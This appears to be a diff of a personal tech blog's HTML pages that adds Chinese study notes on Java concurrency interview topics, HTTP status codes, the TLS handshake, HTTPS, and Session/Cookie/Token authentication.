@@ -117,7 +117,7 @@
         </a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
@@ -174,6 +174,13 @@
 
       <time title="Created: 2023-05-07 21:39:13" itemprop="dateCreated datePublished" datetime="2023-05-07T21:39:13+08:00">2023-05-07</time>
     </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2023-05-10 20:52:41" itemprop="dateModified" datetime="2023-05-10T20:52:41+08:00">2023-05-10</time>
+    </span>
 
   
 </div>
@@ -185,7 +192,134 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          
+          <p>Java 并发编程是 Java 面试中的一个重要部分，因为在现代多核处理器和高并发应用程序中，充分理解并发编程及其挑战非常关键。以下是一些 Java 并发编程的常见面试考点：</p>
+<ol>
+<li><p>Java 中的线程创建和管理：了解如何创建和管理线程，包括使用 <code>Thread</code> 类、<code>Runnable</code> 接口和 Java 8 中的 <code>CompletableFuture</code> 类。</p>
+</li>
+<li><p>线程同步：了解如何使用 <code>synchronized</code> 关键字、<code>ReentrantLock</code>、<code>Semaphore</code> 等同步原语来保证线程安全。</p>
+</li>
+<li><p>线程间通信：了解如何使用 <code>wait()</code>、<code>notify()</code> 和 <code>notifyAll()</code> 方法以及 <code>BlockingQueue</code>、<code>CountDownLatch</code>、<code>CyclicBarrier</code> 等机制进行线程间通信。</p>
+</li>
+<li><p>线程局部变量：了解 <code>ThreadLocal</code> 类的使用，它允许在不同线程中存储和访问线程独立的变量。</p>
+</li>
+<li><p>Java 内存模型：理解 Java 内存模型中的关键概念，如原子性、可见性和有序性，以及如何使用 <code>volatile</code> 关键字和原子操作类（如 <code>AtomicInteger</code>、<code>AtomicLong</code> 等）来确保并发安全。</p>
+</li>
+<li><p>线程池：了解 Java 中线程池的概念和用法，包括 <code>Executor</code>、<code>ExecutorService</code> 和 <code>ScheduledExecutorService</code> 接口，以及 <code>ThreadPoolExecutor</code> 和 <code>ForkJoinPool</code> 等具体实现。</p>
+</li>
+<li><p>并发集合：了解 Java 并发包中提供的线程安全集合类，如 <code>ConcurrentHashMap</code>、<code>CopyOnWriteArrayList</code>、<code>CopyOnWriteArraySet</code> 等。</p>
+</li>
+<li><p>并行流：了解 Java 8 中引入的并行流（Parallel Streams）概念，以及如何利用它进行数据并行处理。</p>
+</li>
+<li><p>CompletableFuture：了解 Java 8 引入的 <code>CompletableFuture</code> 类，它提供了异步编程、组合和转换操作的强大功能。</p>
+</li>
+<li><p>死锁、饥饿和活锁：理解死锁、饥饿和活锁的概念，以及如何检测和解决这些问题。</p>
+</li>
+</ol>
+<p>这些是 Java 并发编程的一些关键考点，掌握它们将有助于面试过程中回答相关问题。同时，在实际项目中应用这些知识，能够更好地解决并发编程中可能遇到的问题。</p>
+<p>以下是一些关于 Java 并发的面试常见问题：</p>
+<ol>
+<li><p>如何在 Java 中创建线程？</p>
+</li>
+<li><p>描述 <code>Runnable</code> 和 <code>Callable</code> 接口之间的区别。</p>
+</li>
+<li><p>什么是线程同步？解释 <code>synchronized</code> 关键字和 <code>ReentrantLock</code>。</p>
+</li>
+<li><p>什么是死锁？如何预防和解决死锁？</p>
+</li>
+<li><p>解释线程间通信的方法，例如 <code>wait()</code>、<code>notify()</code> 和 <code>notifyAll()</code>。</p>
+</li>
+<li><p>什么是线程池？如何在 Java 中创建和使用线程池？</p>
+</li>
+<li><p>描述 Java 中的 <code>Executor</code>、<code>ExecutorService</code> 和 <code>ScheduledExecutorService</code> 接口。</p>
+</li>
+<li><p>什么是 Java 内存模型？解释原子性、可见性和有序性。</p>
+</li>
+<li><p>什么是 <code>volatile</code> 关键字？它如何确保可见性和有序性？</p>
+</li>
+<li><p>解释 Java 中的原子操作类，如 <code>AtomicInteger</code>、<code>AtomicLong</code> 和 <code>AtomicReference</code>。</p>
+</li>
+<li><p>描述 Java 并发包中的线程安全集合类，如 <code>ConcurrentHashMap</code>、<code>CopyOnWriteArrayList</code> 和 <code>CopyOnWriteArraySet</code>。</p>
+</li>
+<li><p>什么是 Java 8 中的并行流（Parallel Streams）？如何使用它们？</p>
+</li>
+<li><p>解释 Java 8 中的 <code>CompletableFuture</code> 类及其用法。</p>
+</li>
+<li><p>描述线程饥饿和活锁问题，以及如何解决它们。</p>
+</li>
+<li><p>什么是 <code>ThreadLocal</code> 类？它如何在 Java 中使用？</p>
+</li>
+</ol>
+<p>这些问题涵盖了 Java 并发编程的各个方面。为了在面试中表现出色，请确保熟悉这些问题并准备好清晰、简洁的答案。同时，在实际项目中应用这些知识，能够更好地解决并发编程中可能遇到的问题。</p>
+<h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><p>线程可以通俗的理解为程序不同的执行路径</p>
+<h2 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h2><ul>
+<li>继承Thread类</li>
+<li>定义一个类实现Runnable接口</li>
+<li>使用Callable和Future创建线程</li>
+<li>通过线程池创建线程</li>
+</ul>
+<p>线程状态</p>
+<p>线程同步</p>
+<h2 id="线程间通信"><a href="#线程间通信" class="headerlink" title="线程间通信"></a>线程间通信</h2><h2 id="线程局部变量"><a href="#线程局部变量" class="headerlink" title="线程局部变量"></a>线程局部变量</h2><p>线程池</p>
+<p>线程顺序执行控制<br>高频面试加分项<br>JDK13&#x2F;14的改变<br>纤程<br>Quasar类库的使用</p>
+<p>在Java和许多其他编程语言中，线程的<code>sleep()</code>方法并不会导致线程释放锁，但是不会阻塞其他线程。</p>
+<p>当一个线程调用<code>sleep()</code>方法时，它会使线程进入阻塞状态一段时间，但该线程仍然保有它已经获得的所有锁。这意味着如果一个线程在进入<code>sleep()</code>之前获得了一个锁，那么它在<code>sleep()</code>期间仍然会保持这个锁，其他线程无法获得这个锁。</p>
+<p>这与线程的<code>wait()</code>方法不同。当一个线程调用<code>wait()</code>方法时，它会释放它在相应对象上的锁，允许其他线程获得这个锁。</p>
+<p>这是因为<code>sleep()</code>和<code>wait()</code>方法的设计目标不同：<code>sleep()</code>方法主要用于让线程暂停一段时间，而<code>wait()</code>方法主要用于实现线程间的同步。所以，在编写多线程程序时，需要根据实际的需求和情况选择合适的方法。</p>
+<h2 id="超线程"><a href="#超线程" class="headerlink" title="超线程"></a>超线程</h2><p>超线程（Hyper-Threading）是Intel公司引入的一种处理器（CPU）技术。这项技术的主要目标是提高处理器核心的效率和性能。超线程通过使单个处理器核心模拟出两个“逻辑”核心，以便同时处理两个线程，从而提高了处理器的并行处理能力。</p>
+<p>传统的单核心处理器在任何时刻只能处理一个线程。但是，由于各种原因（例如，等待数据从内存中加载），处理器可能无法始终保持忙碌状态。在这些情况下，处理器的一部分（例如，算术逻辑单元或浮点单元）可能会闲置，从而造成资源浪费。</p>
+<p>超线程技术试图解决这个问题，通过在单个核心上同时运行两个线程，使得当一个线程在等待时，另一个线程可以使用处理器的资源进行计算。因此，超线程可以使处理器在相同的时间内完成更多的工作，从而提高处理器的整体效率和性能。</p>
+<p>然而，超线程并不总是能提供显著的性能提升。在某些情况下，如果两个线程需要使用相同的处理器资源，那么它们可能会相互竞争，从而导致性能下降。此外，超线程对于多线程程序或多任务环境最有效，对于单线程程序或单任务环境的效果可能不明显。</p>
+<p>请注意，虽然超线程可以提高处理器的并行处理能力，但它并不能取代多核处理器。多核处理器具有多个独立的物理核心，每个核心都可以处理自己的线程，因此它们通常可以提供比超线程更好的并行性和性能。</p>
+<h1 id="CAS"><a href="#CAS" class="headerlink" title="CAS"></a>CAS</h1><h2 id="CAS底层实现"><a href="#CAS底层实现" class="headerlink" title="CAS底层实现"></a>CAS底层实现</h2><p>使用的操作系统原语是lock cmpxchg</p>
+<h1 id="Java内存模型"><a href="#Java内存模型" class="headerlink" title="Java内存模型"></a>Java内存模型</h1><p>原子性</p>
+<p>可见性</p>
+<p>有序性</p>
+<p>进程：CPU分配资源的基本单位</p>
+<p>线程：CPU执行的基本单位</p>
+<p>缓存行对齐 – Disruptor就应用了缓存行对齐技术提高了数据修改效率</p>
+<h2 id="对象内存模型"><a href="#对象内存模型" class="headerlink" title="对象内存模型"></a>对象内存模型</h2><h1 id="synchronized"><a href="#synchronized" class="headerlink" title="synchronized"></a>synchronized</h1><h2 id="synchronized底层实现"><a href="#synchronized底层实现" class="headerlink" title="synchronized底层实现"></a>synchronized底层实现</h2><ol>
+<li>Java代码层面：使用synchronized关键字</li>
+<li>字节码层面：monitorenter、monitorexit</li>
+<li>执行层面：锁升级（偏向锁、自旋锁、重量级锁）</li>
+<li>操作系统层面：使用的操作系统原语是lock cmpxchg</li>
+</ol>
+<h2 id="操作系统的互斥量"><a href="#操作系统的互斥量" class="headerlink" title="操作系统的互斥量"></a>操作系统的互斥量</h2><h2 id="用户态、内核态"><a href="#用户态、内核态" class="headerlink" title="用户态、内核态"></a>用户态、内核态</h2><h2 id="锁消除"><a href="#锁消除" class="headerlink" title="锁消除"></a>锁消除</h2><h2 id="锁粗化"><a href="#锁粗化" class="headerlink" title="锁粗化"></a>锁粗化</h2><h1 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h1><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul>
+<li>保证线程数据一致性（保证可见性）</li>
+<li>禁止指令重排序（保证有序性）</li>
+</ul>
+<h2 id="volatile底层实现"><a href="#volatile底层实现" class="headerlink" title="volatile底层实现"></a>volatile底层实现</h2><p>系统底层实现数据一致性可采用的两种方法：</p>
+<ol>
+<li>缓存一致性协议（MESI）</li>
+<li>锁总线</li>
+</ol>
+<p>系统底层实现数据一致性可采用的两种方法：</p>
+<ol>
+<li>使用内存屏障：JVM层级是给volatile语句前后分别加两个内存屏障，内存屏障前后的指令不能重排序</li>
+<li>锁总线：HotSpot虚拟机使用的操作系统层级的指令是Lock指令（锁总线），而不是内存屏障的系统原语</li>
+</ol>
+<p>volatile在HotSpot的底层实现中之所以不使用内存屏障，是因为内存屏障不能保证一致性，而锁总线既能实现数据一致性，又能实现禁止指令重排序</p>
+<h2 id="DCL单例"><a href="#DCL单例" class="headerlink" title="DCL单例"></a>DCL单例</h2><p>DCL（Double Check Lock）单例为什么需要加volatile？</p>
+<p>如果不加volatile，不能避免指令重排序，初始化指令和堆栈建立连接的指令可能会倒换，即可能出现堆栈建立连接发生在初始化指令之前，即</p>
+<ul>
+<li>加volatile，没有被重排序的指令执行过程如下<ol>
+<li>初始化指令</li>
+<li>堆栈建立连接的指令</li>
+</ol>
+</li>
+<li>不加volatile，可能出现的重排序的指令执行过程如下<ul>
+<li>堆栈建立连接的指令</li>
+<li>初始化指令</li>
+</ul>
+</li>
+</ul>
+<p>这就导致在多线程环境下，如果没有使用volatile，假如一个线程正在使用创建对象，并且发生了指令重排序，使得堆栈建立连接的指令发生在初始化指令之前，那么当这条线程恰好执行完堆栈建立连接的指令，还没有执行初始化指令时，有一个新的线程线程执行DCL单例的函数，判断得到栈中已经指向堆中已有的对象，就会执行返回此对象，而此时对象还没有被初始化，此时获取的对象的值仅仅是默认值而不是初始化的值。</p>
+<h1 id="ThreadLocal"><a href="#ThreadLocal" class="headerlink" title="ThreadLocal"></a>ThreadLocal</h1><p><code>ThreadLocal</code>由一个线程的类型为<code>ThreadLocal.ThreadLocalMap</code>的对象threadlocals来保存。具体来说，在<code>ThreadLocalMap</code>中，set到<code>ThreadLocal</code>对象的值作为值（value），<code>ThreadLocal</code>对象作为键（key），并且key是一个弱引用。</p>
+<h1 id="ThreadPool"><a href="#ThreadPool" class="headerlink" title="ThreadPool"></a>ThreadPool</h1><h1 id="AQS"><a href="#AQS" class="headerlink" title="AQS"></a>AQS</h1><p>是volatile和CAS和队列的组合应用</p>
+<h1 id="并发集合"><a href="#并发集合" class="headerlink" title="并发集合"></a>并发集合</h1><h1 id="同步容器"><a href="#同步容器" class="headerlink" title="同步容器"></a>同步容器</h1><p>同步容器类的演变<br>Map&#x2F;Set从无锁到同步<br>ArrayList<br>LinkedList<br>Collections.synchronizedXXX<br>CopyOnWriteList<br>队列<br>ConcurrentLinkedQueue<br>ConcurrentArrayQueue<br>LinkedBlockingQueue<br>Queue<br>ArrayBlockingQueue<br>TransferQueue<br>SynchronousQueue<br>DelayQueue</p>
+<h1 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h1><p>ThreadPool与Executor<br>ExecuteService<br>Excecutors<br>Callable-带返回值的Runnable<br>异步调用Future<br>fixed<br>cached<br>single<br>常用线程池<br>scheduled<br>workstealing<br>forkjoin<br>ParallelStreamAPI</p>
+<h1 id="死锁、饥饿、活锁"><a href="#死锁、饥饿、活锁" class="headerlink" title="死锁、饥饿、活锁"></a>死锁、饥饿、活锁</h1><h1 id="JUC同步工具"><a href="#JUC同步工具" class="headerlink" title="JUC同步工具"></a>JUC同步工具</h1><p>cas自旋原理<br>ReentrantLock可重入锁<br>Condition条件等待与通知<br>Latch<br>cyclicBarrier线程栅栏<br>Semaphore信号量<br>Semaphore与Lock的区别(高频面试)<br>ThreadLocal线程本地变量（高频面试)<br>phaser<br>Exchanger</p>
+<h1 id="JMH"><a href="#JMH" class="headerlink" title="JMH"></a>JMH</h1><p>JMH解决什么问题<br>JMH插件安装<br>JMH吞吐量测试<br>JMH QPS&#x2F;TPS测试</p>
+
       
     </div>
 
@@ -247,7 +381,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2023-05-09 11:41:10" itemprop="dateModified" datetime="2023-05-09T11:41:10+08:00">2023-05-09</time>
+      <time title="Modified: 2023-05-10 08:58:04" itemprop="dateModified" datetime="2023-05-10T08:58:04+08:00">2023-05-10</time>
     </span>
 
   
@@ -466,6 +600,108 @@
 <ul>
 <li>允许在单个TCP连接上同时发送和接收多个请求和响应</li>
 </ul>
+<h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><p>HTTP 状态码（HTTP Status Codes）是服务器用于表示客户端请求结果的三位数字。状态码分为五类，各类状态码的含义如下：</p>
+<p>1xx（信息响应）：请求已接收，继续处理。</p>
+<p>2xx（成功）：请求已成功接收、理解和接受。</p>
+<p>3xx（重定向）：需要后续操作才能完成请求。</p>
+<p>4xx（客户端错误）：请求包含错误语法或无法完成。</p>
+<p>5xx（服务器错误）：服务器在处理请求时发生错误。</p>
+<table>
+<thead>
+<tr>
+<th>状态码</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>100</td>
+<td>Continue: 请求已接收，继续处理。</td>
+</tr>
+<tr>
+<td>200</td>
+<td>OK: 请求成功，服务器已经处理了请求并返回了所需数据。</td>
+</tr>
+<tr>
+<td>201</td>
+<td>Created: 请求成功并已创建了新资源。</td>
+</tr>
+<tr>
+<td>202</td>
+<td>Accepted: 请求已被接受，但尚未处理。</td>
+</tr>
+<tr>
+<td>204</td>
+<td>No Content: 请求成功，但无需返回任何内容。</td>
+</tr>
+<tr>
+<td>300</td>
+<td>Multiple Choices: 请求的资源有多个表示。</td>
+</tr>
+<tr>
+<td>301</td>
+<td>Moved Permanently: 请求的资源已被永久移动到新的 URL。</td>
+</tr>
+<tr>
+<td>302</td>
+<td>Found: 请求的资源临时移动到新的 URL。</td>
+</tr>
+<tr>
+<td>303</td>
+<td>See Other: 对于 POST 请求，资源的响应可以在另一个 URL 上找到。</td>
+</tr>
+<tr>
+<td>304</td>
+<td>Not Modified: 资源自上次请求以来未发生更改。</td>
+</tr>
+<tr>
+<td>307</td>
+<td>Temporary Redirect: 请求的资源临时移动到新的 URL。</td>
+</tr>
+<tr>
+<td>308</td>
+<td>Permanent Redirect: 请求的资源已被永久移动到新的 URL。</td>
+</tr>
+<tr>
+<td>400</td>
+<td>Bad Request: 请求格式错误或服务器无法理解请求。</td>
+</tr>
+<tr>
+<td>401</td>
+<td>Unauthorized: 请求需要认证。客户端应提供认证信息。</td>
+</tr>
+<tr>
+<td>403</td>
+<td>Forbidden: 客户端没有权限访问所请求的资源。</td>
+</tr>
+<tr>
+<td>404</td>
+<td>Not Found: 服务器找不到请求的资源。</td>
+</tr>
+<tr>
+<td>405</td>
+<td>Method Not Allowed: 请求方法（GET、POST 等）对于所请求的资源不允许。</td>
+</tr>
+<tr>
+<td>500</td>
+<td>Internal Server Error: 服务器在处理请求时遇到内部错误。</td>
+</tr>
+<tr>
+<td>501</td>
+<td>Not Implemented: 服务器不支持请求所需要的功能。</td>
+</tr>
+<tr>
+<td>502</td>
+<td>Bad Gateway: 作为网关或代理角色的服务器从上游服务器接收到无效响应。</td>
+</tr>
+<tr>
+<td>503</td>
+<td>Service Unavailable: 服务器暂时无法处理请求（由于过载或维护）。</td>
+</tr>
+<tr>
+<td>504</td>
+<td>Gateway Timeout: 作为网关或代理角色的服务器未及时从上游服务器收到请求。</td>
+</tr>
+</tbody></table>
 <h1 id="WebSockets"><a href="#WebSockets" class="headerlink" title="WebSockets"></a>WebSockets</h1><p>WebSocket是一种通信协议，它在单个TCP连接上提供了全双工通信，允许客户端和服务器同时发送和接收消息。。WebSocket协议旨在解决HTTP协议在实时通信场景中的局限性，如低延迟和服务器主动推送消息等。</p>
 <p>WebSocket协议的主要特点如下：</p>
 <ol>
@@ -521,7 +757,6 @@
 <li>Twofish：Twofish是Blowfish算法的继任者，也是AES算法竞争过程中的一个候选算法。Twofish使用128位的块大小和可变长度的密钥（128、192或256位）。尽管它在安全性和效率方面表现良好，但它没有像AES那样被广泛采用。</li>
 </ol>
 <p>对称加密算法在许多密码学应用中都有广泛应用，如保护数据的机密性、安全通信和身份认证等。然而，它们的一个主要局限性是密钥管理和分发。在许多场景中，对称加密算法与非对称加密算法结合使用。在这种混合方法中，非对称加密算法用于安全地交换对称密钥，而对称加密算法则用于实际的数据加密和解密。这种组合利用了非对称加密算法在密钥管理和分发方面安全性高的优势，同时保留了对称加密算法在数据加密和解密方面的高效性。</p>
-<p>例如，在SSL&#x2F;TLS（安全套接层&#x2F;传输层安全）协议中，服务器和客户端之间的通信就使用了混合加密方案。在握手阶段，双方使用非对称加密算法来安全地交换对称密钥。然后，在接下来的会话期间，双方使用对称加密算法对数据进行加密和解密。这样，SSL&#x2F;TLS协议既能确保密钥的安全分发，又能高效地保护数据的机密性。</p>
 <h2 id="非对称密钥算法"><a href="#非对称密钥算法" class="headerlink" title="非对称密钥算法"></a>非对称密钥算法</h2><p>非对称密钥算法，又称公钥加密算法，是一种加密和解密过程中使用不同密钥的加密方法。在非对称加密算法中，通常有一对密钥，一个是公钥，另一个是私钥。公钥用于加密数据，而私钥用于解密数据。以下是实际中常用的非对称密钥算法：</p>
 <ol>
 <li><p>RSA（Rivest-Shamir-Adleman）算法：RSA 是一种广泛应用的非对称加密算法，由 Ron Rivest、Adi Shamir 和 Leonard Adleman 于 1978 年发明。RSA 算法基于大数因子分解问题，它的安全性依赖于大数分解的困难性。RSA 用于加密、解密和数字签名，应用领域包括网页浏览器、电子邮件、VPN 等。</p>
@@ -561,9 +796,78 @@
 </li>
 </ol>
 <p>数字证书在互联网安全中发挥了重要的作用，可以用于保护网站的安全，防止中间人攻击、数据篡改等恶意行为。同时，数字证书也可以用于身份认证、数字签名等场景，确保数字数据的安全性和可信性。</p>
-<h2 id="SSL-x2F-TLS"><a href="#SSL-x2F-TLS" class="headerlink" title="SSL&#x2F;TLS"></a>SSL&#x2F;TLS</h2><h1 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h1><h2 id="HTTPS建立连接的过程"><a href="#HTTPS建立连接的过程" class="headerlink" title="HTTPS建立连接的过程"></a>HTTPS建立连接的过程</h2><h1 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h1><h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><h1 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h1><p>Token的引入目的：为了减少服务端频繁的去数据库查询用户名和密码的操作。</p>
-<p>Token的定义：又称“令牌”，Token是服务端生成的一串字符串，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。</p>
-<p>Token常用的实现方式：JWT</p>
+<h2 id="SSL-x2F-TLS"><a href="#SSL-x2F-TLS" class="headerlink" title="SSL&#x2F;TLS"></a>SSL&#x2F;TLS</h2><p>SSL（安全套接层）和TLS（传输层安全）的关系是发展演进关系。TLS是SSL的更新和改进版本。虽然二者经常一起提及，但目前主要使用的是TLS协议，因为它比SSL更安全、更先进。</p>
+<p>TLS的工作原理：</p>
+<ol>
+<li>客户端使用非对称加密与服务器进行通信，实现身份验证并协商对称加密使用的密钥</li>
+<li>采用对称加密算法对信息摘要进行加密</li>
+</ol>
+<p>这样，SSL&#x2F;TLS协议在服务器和客户端之间的通信使用了混合加密方案，既能确保密钥的安全分发，又能保证数据加密的高效性</p>
+<h3 id="TLS-握手有哪些步骤？"><a href="#TLS-握手有哪些步骤？" class="headerlink" title="TLS 握手有哪些步骤？"></a>TLS 握手有哪些步骤？</h3><p><img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/5aYOr5erfyNBq20X5djTco/3c859532c91f25d961b2884bf521c1eb/tls-ssl-handshake.png" alt="TLS 握手"></p>
+<p>TLS 握手是由客户端和服务器交换的一系列数据报或消息。TLS 握手涉及多个步骤，因为客户端和服务器要交换完成握手和进行进一步对话所需的信息。</p>
+<p>TLS 握手中的确切步骤将根据所使用的密钥交换算法的种类和双方支持的密码套件而有所不同。大致如下：</p>
+<ol>
+<li><strong>“客户端问候（client hello）” 消息：</strong> 客户端通过向服务器发送“问候”消息来开始握手。该消息将包含客户端支持的 TLS 版本，支持的密码套件（密码套件是一组用于建立安全通信连接的算法），以及称为一串称为“客户端随机数（client random）”的随机字节。</li>
+<li><strong>“服务器问候（server hello）”消息：</strong> 作为对 client hello 消息的回复，服务器发送一条消息，内含服务器的 <a target="_blank" rel="noopener" href="https://www.cloudflare.com/learning/ssl/what-is-an-ssl-certificate/">SSL 证书</a>（SSL证书是一种数字证书，是由数字证书颁发机构（CA）签发的数字证书的一种 ）、服务器选择的密码套件，以及“服务器随机数（server random）”，即由服务器生成的另一串随机字节。</li>
+<li><strong>身份验证：</strong> 客户端使用颁发该证书的证书颁发机构验证服务器的 SSL 证书。此举确认服务器是其声称的身份，且客户端正在与该域的实际所有者进行交互。</li>
+<li><strong>预主密钥（是在SSL&#x2F;TLS握手期间由客户端生成的随机密钥，用于协商会话密钥）：</strong> 客户端再发送一串随机字节，即“预主密钥（premaster secret）”。预主密钥是使用公钥<a target="_blank" rel="noopener" href="https://www.cloudflare.com/learning/ssl/how-does-public-key-encryption-work/">公钥</a>（客户端从服务器的 SSL 证书中获得公钥）加密的，只能使用服务器的私钥解密。</li>
+<li><strong>私钥被使用：</strong>服务器对预主密钥进行解密。</li>
+<li><strong>生成会话密钥：</strong>客户端和服务器均使用客户端随机数、服务器随机数和预主密钥生成会话密钥。双方应得到相同的结果。</li>
+<li><strong>客户端就绪：</strong>客户端发送一条“已完成”消息，该消息用会话密钥加密。</li>
+<li><strong>服务器就绪：</strong>服务器发送一条“已完成”消息，该消息用会话密钥加密。</li>
+<li><strong>实现安全对称加密：</strong>已完成握手，并使用会话密钥继续进行通信。</li>
+</ol>
+<h3 id="TLS-握手期间会发生什么？"><a href="#TLS-握手期间会发生什么？" class="headerlink" title="TLS 握手期间会发生什么？"></a>TLS 握手期间会发生什么？</h3><p>在 TLS 握手过程中，客户端和服务器一同执行以下操作：</p>
+<ul>
+<li>指定将要使用的 TLS 版本（如TLS 1.0、1.2、1.3 等）</li>
+<li>决定将要使用哪些密码套件</li>
+<li>通过服务器的公钥和 SSL 证书颁发机构的数字签名来验证服务器的身份</li>
+<li>生成会话密钥，以在握手完成后使用对称加密</li>
+</ul>
+<h1 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h1><p>HTTPS（超文本传输安全协议）是一种用于保护网络通信安全和数据传输完整性的协议。它在HTTP（超文本传输协议）的基础上添加了SSL&#x2F;TLS加密层，为数据传输提供加密、身份验证和完整性保护。</p>
+<h2 id="主要作用"><a href="#主要作用" class="headerlink" title="主要作用"></a>主要作用</h2><ol>
+<li>加密通信：HTTPS通过SSL&#x2F;TLS协议加密数据，确保数据在传输过程中不被未经授权的第三方窃取或篡改。</li>
+<li>身份验证：HTTPS使用数字证书对服务器进行身份验证，防止用户连接到伪造的服务器，降低中间人攻击的风险。</li>
+<li>数据完整性：HTTPS确保数据在传输过程中不会被篡改，从而保证了数据的完整性。</li>
+</ol>
+<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><ol>
+<li>用户在浏览器中输入HTTPS网址并发送请求。</li>
+<li>服务器收到请求后返回其数字证书，包括公钥和证书颁发机构（CA）的签名等信息。</li>
+<li>浏览器验证服务器证书的有效性，包括证书的颁发者、有效期等。</li>
+<li>若验证通过，浏览器使用服务器的公钥加密一个随机生成的会话密钥，并将其发送给服务器。</li>
+<li>服务器使用自己的私钥解密会话密钥，然后使用会话密钥对数据进行加密传输。</li>
+<li>浏览器使用会话密钥对接收到的加密数据进行解密，展示网页内容。</li>
+</ol>
+<h1 id="Session、Cookie、Token"><a href="#Session、Cookie、Token" class="headerlink" title="Session、Cookie、Token"></a>Session、Cookie、Token</h1><h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><p>Session 是服务器端用来跟踪和维护用户状态的技术。服务器为每个用户创建一个唯一的 Session ID，并将其与用户的会话数据关联。Session ID 通常通过 Cookie、URL 参数或隐藏表单字段的方式传递给客户端。Session 主要用于识别用户身份、存储用户信息等场景。</p>
+<p><code>HttpSession</code> 对象并不是 <code>HttpServletRequest</code> 自带的，但可以通过 <code>HttpServletRequest</code> 对象的 <code>getSession</code> 方法轻松获取。当调用 <code>request.getSession()</code> 时，如果当前请求没有关联的会话，它会自动为您创建一个新的会话。如果只想在已经存在的会话中获取，而不创建新的会话，可以调用 <code>request.getSession(false)</code>。这样，如果没有关联的会话，它将返回 <code>null</code>。</p>
+<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>Cookie 是一种存储在客户端（如浏览器）的小型文本文件，用于保存服务器发送给客户端的信息。服务器可以设置、读取和修改 Cookie 以识别和追踪用户。Cookie 可以存储一些简单的数据，如用户 ID、登录状态等。</p>
+<p><code>Cookie</code> 对象不是 <code>HttpServletRequest</code> 自带的，但可以通过 <code>HttpServletRequest</code> 对象的 <code>getCookies</code> 方法轻松获取。这个方法会返回一个 <code>Cookie</code> 数组，其中包含客户端发送给服务器的所有 Cookie。若客户端没有发送任何 Cookie，这个方法将返回 <code>null</code>。</p>
+<h2 id="Session和Cookie的区别"><a href="#Session和Cookie的区别" class="headerlink" title="Session和Cookie的区别"></a>Session和Cookie的区别</h2><ol>
+<li>存储位置不同：Session 存储在服务器端，依赖于 Cookie 或其他方式传递 Session ID；Cookie 存储在客户端；</li>
+<li>存储的数据类型不同：Session能够存储任意的JAVA对象，Cookie只能存储String类型的对象。</li>
+</ol>
+<h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>Token又称“令牌”，Token是服务端生成的一串字符串，用于身份验证，当第一次登录后，服务器生成一个Token并将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据，服务器就可以根据Token信息验证客户端的身份并确定其访问权限。</p>
+<h3 id="引入目的"><a href="#引入目的" class="headerlink" title="引入目的"></a>引入目的</h3><p>Token（令牌）的引入是为了解决一些基于传统 Session 和 Cookie 机制的安全性和可扩展性问题。Token 的设计思路是为了在客户端和服务器之间建立一种无状态、可靠的身份验证机制。引入 Token 的原因主要包括以下几点：</p>
+<ol>
+<li><p>分布式系统和微服务：在分布式系统和微服务架构中，多个不同的服务器可能需要处理同一个客户端的请求。这种情况下，使用基于服务器的会话管理（如 Session + Cookie）可能导致不一致的状态。Token 提供了一种无状态的解决方案，可以在不同的服务器间共享和验证，从而更适合分布式和微服务环境。</p>
+</li>
+<li><p>安全性：Token 可以提供更好的安全性。相对于传统的 Cookie 机制，Token 可以降低 CSRF（跨站请求伪造）攻击的风险。此外，Token 可以包含签名或加密，以确保数据的完整性和安全性。例如，JWT（JSON Web Token）就是一种常见的 Token 实现方式，它支持签名和加密。</p>
+</li>
+<li><p>跨域访问：Token 可以更轻松地支持跨域访问。在基于 Token 的身份验证中，客户端可以将 Token 放在请求头（如 <code>Authorization</code> 头）中，从而避免浏览器的 Cookie 跨域限制。</p>
+</li>
+<li><p>多设备和多平台支持：Token 可以灵活地应用于不同的客户端设备和平台。由于 Token 可以通过请求头、URL 参数或请求体等多种方式传输，它可以轻松地在 Web、移动设备和桌面应用等多种场景下使用。</p>
+</li>
+<li><p>易于集成：Token 机制通常易于与第三方服务集成，如 OAuth2 和 OpenID Connect 等身份验证协议。这些协议允许用户使用第三方帐户（如 Google、Facebook 或 GitHub）登录应用，而无需创建新的帐户。</p>
+</li>
+</ol>
+<p>总之，Token 引入主要是为了解决传统基于 Session 和 Cookie 的身份验证机制在安全性、可扩展性和跨平台支持方面的挑战。Token 为构建无状态、可扩展且安全的身份验证解决方案提供了一种有效的方法。</p>
